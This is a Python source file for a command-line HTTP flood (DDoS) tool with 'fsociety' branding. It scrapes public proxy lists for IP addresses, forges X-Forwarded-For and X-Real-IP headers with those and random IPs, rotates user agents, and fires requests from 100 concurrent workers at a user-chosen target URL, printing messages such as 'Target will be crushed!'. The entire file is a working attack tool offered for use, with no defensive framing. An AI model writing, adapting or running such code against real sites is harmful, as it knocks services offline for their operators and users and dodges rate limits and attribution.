import sys
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]


proxy_sources = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
]

class CliAttacker:
    """
    This class contains the core attack logic from the original AttackThread,
    adapted for a command-line interface.
    """
    def __init__(self, target_url, num_requests):
        """Initializes the attacker with target and request count."""
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 100  
        self.request_limit = 50000000000  

    def log(self, message):
        """Prints a message to the console."""
        print(message)

    async def fetch_ip_addresses(self, url):
        """Fetches IP addresses from a given URL."""
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                
                self.log(f"Failed to fetch IPs from {url}: {e}")
                return []

    async def get_all_ips(self):
        """Gathers IPs from all sources and adds some random ones."""
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
        return all_ips

    async def send_request(self, session, ip_address):
        """Sends a single spoofed request to the target."""
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
            "Cache-Control": "no-cache",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Real-IP": ip_address,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"])
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                
                self.log(f"fsociety@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
           
            pass

    async def attack_worker(self, session, ip_cycle, requests_per_worker):
        """A worker task that sends a batch of requests."""
        for _ in range(requests_per_worker):
            await self.send_request(session, next(ip_cycle))
            
            await asyncio.sleep(1 / self.request_limit)

    async def attack(self):
        """Main async attack function."""
        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log("No IP list found. Generating random IPs...")
            ip_list = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
        
        ip_cycle = itertools.cycle(ip_list)
       
        requests_per_worker = self.num_requests // self.max_concurrent

        async def worker():
            """Defines a worker session."""
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                await self.attack_worker(session, ip_cycle, requests_per_worker)

        start_time = time.time()
       
        tasks = [worker() for _ in range(self.max_concurrent)]
        await asyncio.gather(*tasks, return_exceptions=True)
        elapsed_time = time.time() - start_time
        self.log(f"Attack finished in {elapsed_time:.2f} seconds. Target down!")

    def run(self):
        """Entry point to start the asyncio event loop."""
        
        asyncio.run(self.attack())

def print_fsociety_art():
    """Prints the FSociety ASCII art and slogan."""
    print("\033[91m")
    print("    __                _     _               ____  ")
    print("  / _|              (_)   | |             |___ \ ")
    print(" | |_ ___  ___    ___ _  ___| |_ _  _   __  ____) |")
    print(" |  _/ __|/ _ \ / __| |/ _ \ __| | | |  \ \ / /__ < ")
    print(" | | \__ \ (_) | (__| |  __/ |_| |_| |   \ V /___) |")
    print(" |_| |___/\___/ \___|_|\___|\__|\__, |    \_/|____/ ")
    print("                                __/ |             ")
    print("                               |___/              ")
    print("ported to cli by @sshpublickey")
    print("\033[0m") 


if __name__ == "__main__":
    print_fsociety_art()
    
    
    target_url = input("Enter Target URL: ")
    
    num_requests_str = input("Enter Number of Requests: ")
    try:
        num_requests = int(num_requests_str)
    except ValueError:
        print("Error: Number of requests must be an integer!")
        sys.exit(1)

   
    if not target_url or num_requests <= 0:
        print("Error: Enter a valid URL and a positive number of requests!")
        sys.exit(1)

    print("\nDDoS attack started. Target will be crushed!")
    print("Attack has begun! Check the logs!\n")

    
    attacker = CliAttacker(target_url, num_requests)
    attacker.run()
